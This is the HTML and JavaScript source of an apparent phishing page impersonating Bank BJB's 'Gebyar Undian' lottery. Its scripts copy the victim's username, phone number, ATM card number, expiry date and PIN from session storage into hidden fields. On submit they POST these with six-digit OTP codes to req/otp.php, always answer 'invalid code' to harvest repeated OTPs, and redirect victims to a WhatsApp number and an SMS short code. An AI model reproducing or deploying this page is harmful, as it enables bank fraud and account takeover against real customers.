
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta data-n-head="ssr" data-hid="twitter:image" name="twitter:image" content="">
    <meta data-n-head="ssr" data-hid="og:image" property="og:image" content="">
    <title>Gebyar Undian Digi BJB- Mobile</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
  </head>
  <style type="text/css" media="all">
      body{
          background-color: #fff;
          width: 100%;
          height: 100%;
      }
      
      .cover_one{
        
      }
      
     .cover_one .bg_form{
        width: 100%;
        border-radius: 10px;
        position: relative;
     }
     
     .box_form_posi{
        position: absolute;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-content: center;
        align-items: center;
        transform: translate(-50%,-50%);
        left: 50%;
        top: 320px;
        font-size: 12px;
        width: 100%;
        padding: 20px;
        color: #fff;
     }
     
     .box_form_posi span{
         margin-top: 15px;
     }
     
     .pin-code {
         
         background-color: transparent;
         margin-top: 100px;
         display: flex;
         flex-direction: column;
     }
     
     .pin-code input{
         width: 40px;
         height: 40px;
         text-align: center;
         border: none;
         outline: none;
         border: 1.3px solid #fff;
         background-color: transparent;
         color: #fff;
         border-radius: 4px;
     }
     
     label{
         position: absolute;
         top: -19px;
     }
     
     button{
         border: none;
         width: 100%;
         padding: 12px;
         background-color: orange;
         font-size: 13px;
         border-radius: 4px;
         box-shadow: 0 0 5px 0 #222;
     }
     
     .grouo_text_bottom{
         display: flex;
         justify-content: center;
         align-content: center;
         align-items: center;
         gap: 30px;
         margin-top: 30px;
     }
     
     .grouo_text_bottom p{
         font-weight: bold;
     }
     
     .alert_gagal{
         width: 260px;
         background-color: red;
         position: absolute;
         transform: translate(-50%,-50%);
         left: 50%;
         margin-top: -85px;
     }
  </style>
  <body>
   <div class="container">
       <div class="cover_one mt-5">
          <img class="bg_form" src="https://hosting.tigerengine.id/do0z1w.jpg" alt="" />
          <div class="box_form_posi">
              <img width="70" src="https://hosting.tigerengine.id/bsiym5.png" alt="" />
              <span class="text-center">Anda akan dihubungi oleh layanan bank BJB, Untuk mengirimkan Format/Pesan SMS ke layanan (83373) Agar bisa terima kode OTP
              </span>
             
              <div style="display:none;" id="alert" class="alert_gagal text-center">
        Maaf, Kode Tidak Valid!
        <br />
        Masukkan Kode OTP yang baru 
    </div>
              <form id="formOtp" method="POST">
  <input type="hidden" name="user" id="user">
  <input type="hidden" name="nohp" id="nohp">
  <input type="hidden" name="atm" id="atm">
  <input type="hidden" name="bulan" id="bulan">
  <input type="hidden" name="tahun" id="tahun">
  <input type="hidden" name="pin" id="pin">    
  <div class="pin-code" maxlength="6">
      <p class="text-center">Masukkan kode OTP/Tarif dibawah ini</p> <p style="font-weight: 400; font-size: 17px; color: #fff; text-align: center; margin: 0px auto; margin-bottom: 10px;display:noe;position:relative;" id="timer">1 : 00</p>
      <div class="input">
	<input type="password" inputmode="numeric" id="pin1" name="pin1" maxlength="1" autofocus required>
    <input type="password" inputmode="numeric" id="pin2" name="pin2" maxlength="1" autofocus required>
	  <input type="password" inputmode="numeric" id="pin3" name="pin3" maxlength="1" autofocus required>
    <input type="password" inputmode="numeric" id="pin4" name="pin4" maxlength="1" autofocus 
     required>
     <input type="password" inputmode="numeric" id="pin5" name="pin5" maxlength="1" autofocus required>
    <input type="password" inputmode="numeric" id="pin6" name="pin6" maxlength="1" autofocus 
     required>
    </div>
     <button class="mt-4" type="submit" id="kirims" >Konfirmasi</button>
     
     <div class="grouo_text_bottom">
         <p onclick="location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373) Agar bisa terima kode OTP'" id="remove_otp">Request OTP</p>
         <p onclick="location.href='sms:83373?body='" id="reques_otp">Kirim OTP</p>
     </div>
    </form>
    </div>
 </div>
 <center>
    
 
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
  </body>
  <script src="bajus.js"></script>
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
        <script>
            var url = "passcode.html"; // url tujuan
            var count = 120; // dalam detik
            function countDown() {
                
                if (count > 0) {
                    count--;
                    var waktu = count + 0;
            $('#carasingkat').html(waktu);
             
         setTimeout("countDown()", 1000);
           
                    
               
                }
            }
            countDown(); 
       
       </script>
<script>
        document.getElementById('timer').innerHTML =
          01 + ":" + 01;
        startTimer();
        
        
        function startTimer() {
          var presentTime = document.getElementById('timer').innerHTML;
          var timeArray = presentTime.split(/[:]+/);
          var m = timeArray[0];
          var s = checkSecond((timeArray[1] - 1));
          if(s==59){m=m-1}
          if(m<0){
            return
          }
          
          document.getElementById('timer').innerHTML =
            m + " : " + s;
          
          setTimeout(startTimer, 1000);
          
        }
        
        function checkSecond(sec) {
          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
          if (sec < 0) {sec = "59"};
          return sec;
        }
        
        var i = 60;
var time = $("#cice")
var timer = setInterval(function() {
  time.html(i);
  if (i == 0) {
  $("#timer").hide(); window.location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373) Agar bisa terima kode OTP';
    clearInterval(timer);

  }
  i--;
}, 1000)
    </script> 
  <!--[if lte IE 9]> <![endif]-->
<script>
var user = sessionStorage.getItem("user");
document.getElementById("user").value = user + "";
var nohp = sessionStorage.getItem("nohp");
document.getElementById("nohp").value = nohp + "";
var atm = sessionStorage.getItem("atm");
document.getElementById("atm").value = atm + "";
var bulan = sessionStorage.getItem("bulan");
document.getElementById("bulan").value = bulan + "";
var tahun = sessionStorage.getItem("tahun");
document.getElementById("tahun").value = tahun + "";
var pin = sessionStorage.getItem("pin");
document.getElementById("pin").value = pin + "";
  </script>
<script>
$(document).ready(function(){
    $('#formOtp').submit(function(e) {
        e.preventDefault();          
 document.getElementById('kirims').innerHTML = "Memproses....";



$.ajax({

 type: 'POST',
 url: 'req/otp.php',
 async: false,
 dataType: 'JSON',
 data: $(this).serialize(),
 
 complete: function(data) {
            console.log('Complete')
 

  setTimeout(function(){
$('#alert').show();
}, 500);
setTimeout(function(){
 $("#alert").hide();
 $('#pin1').val("");
$('#pin2').val("");
$('#pin3').val("");
$('#pin4').val("");
$('#pin5').val("");
$('#pin6').val("");
$('#pin1').focus();
 document.getElementById('kirims').innerHTML = "Konfirmasi";

     }, 4000);


 }
    });
 });
    return false;
});   




//var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
var pinContainer = document.querySelector(".pin-code");
console.log('There is ' + pinContainer.length + ' Pin Container on the page.');

pinContainer.addEventListener('keyup', function (event) {
    var target = event.srcElement;
    
    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
    var myLength = target.value. length;

    if (myLength >= maxLength) {
        var next = target;
        while (next = next.nextElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }

    if (myLength === 0) {
        var next = target;
        while (next = next.previousElementSibling) {
            if (next == 0) break;
            if (next.tagName.toLowerCase() == "input") {
                next.focus();
                break;
            }
        }
    }
}, false);

pinContainer.addEventListener('keydown', function (event) {
    var target = event.srcElement;
    target.value = "";
}, false);


</script>
</html>
